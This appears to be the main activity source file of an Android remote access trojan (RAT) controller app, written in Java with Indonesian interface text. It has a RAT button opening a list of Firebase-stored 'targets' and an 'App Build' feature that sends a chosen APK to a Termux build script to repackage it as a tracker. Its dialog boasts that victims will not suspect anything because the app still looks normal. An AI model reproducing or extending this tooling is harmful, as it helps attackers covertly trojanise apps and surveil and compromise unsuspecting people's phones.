package com.paragon.control;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private Button btnGuideTermux, btnGuideVps, btnAppBuild, btnRAT;
    private TextView navBeranda, navMenu, navTools, navSetting;

    private static final int REQUEST_APP_BUILD = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnGuideTermux = findViewById(R.id.btnGuideTermux);
        btnGuideVps = findViewById(R.id.btnGuideVps);
        btnAppBuild = findViewById(R.id.btnAppBuild);
        btnRAT = findViewById(R.id.btnRAT);
        navBeranda = findViewById(R.id.navBeranda);
        navMenu = findViewById(R.id.navMenu);
        navTools = findViewById(R.id.navTools);
        navSetting = findViewById(R.id.navSetting);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");

        // ===== RAT =====
        btnRAT.setOnClickListener(v -> {
            startActivity(new Intent(this, TargetListActivity.class));
        });

        // ===== APP BUILD =====
        btnAppBuild.setOnClickListener(v -> showAppBuildDialog());

        // ===== NAVIGASI =====
        navBeranda.setOnClickListener(v -> setNavActive(navBeranda));
        navMenu.setOnClickListener(v -> {
            setNavActive(navMenu);
            Toast.makeText(this, "📋 Menu", Toast.LENGTH_SHORT).show();
        });
        navTools.setOnClickListener(v -> {
            setNavActive(navTools);
            startActivity(new Intent(this, TargetListActivity.class));
        });
        navSetting.setOnClickListener(v -> {
            setNavActive(navSetting);
            startActivity(new Intent(this, SettingActivity.class));
        });

        // ===== GUIDE =====
        btnGuideTermux.setOnClickListener(v -> {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/syam_guide")));
        });
        btnGuideVps.setOnClickListener(v -> {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/syam_vps")));
        });
    }

    private void showAppBuildDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🔧 App Build");
        builder.setMessage("Pilih APK dari storage untuk diubah menjadi Raven Tracer.\n\nTarget gak akan curiga karena APK tetap keliatan kayak aplikasi biasa.");
        builder.setPositiveButton("📁 PILIH APK", (dialog, which) -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("application/vnd.android.package-archive");
            startActivityForResult(intent, REQUEST_APP_BUILD);
        });
        builder.setNegativeButton("Batal", null);
        builder.show();
    }

    private void setNavActive(TextView active) {
        TextView[] navs = {navBeranda, navMenu, navTools, navSetting};
        for (TextView nav : navs) {
            if (nav == active) {
                nav.setTextColor(getColor(R.color.primary));
                nav.setBackgroundResource(R.drawable.nav_active);
            } else {
                nav.setTextColor(getColor(R.color.secondary));
                nav.setBackgroundResource(0);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_APP_BUILD && resultCode == RESULT_OK && data != null) {
            Uri apkUri = data.getData();
            String apkPath = getRealPathFromURI(apkUri);
            if (apkPath != null) {
                sendToTermux(apkPath);
            } else {
                Toast.makeText(this, "❌ Gagal membaca file", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private String getRealPathFromURI(Uri uri) {
        String path = null;
        try {
            String[] projection = {android.provider.MediaStore.Files.FileColumns.DATA};
            android.database.Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Files.FileColumns.DATA);
                cursor.moveToFirst();
                path = cursor.getString(columnIndex);
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return path;
    }

    private void sendToTermux(String apkPath) {
        if (!isTermuxInstalled()) {
            Toast.makeText(this, "⚠️ Termux belum terinstall!\nDownload dari F-Droid", Toast.LENGTH_LONG).show();
            return;
        }
        try {
            Intent intent = new Intent("com.termux.RUN_COMMAND");
            intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/home/build.sh");
            intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{apkPath});
            intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
            startActivity(intent);
            Toast.makeText(this, "⏳ Proses build dimulai di Termux...", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "❌ Gagal membuka Termux: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private boolean isTermuxInstalled() {
        try {
            getPackageManager().getPackageInfo("com.termux", 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
            }
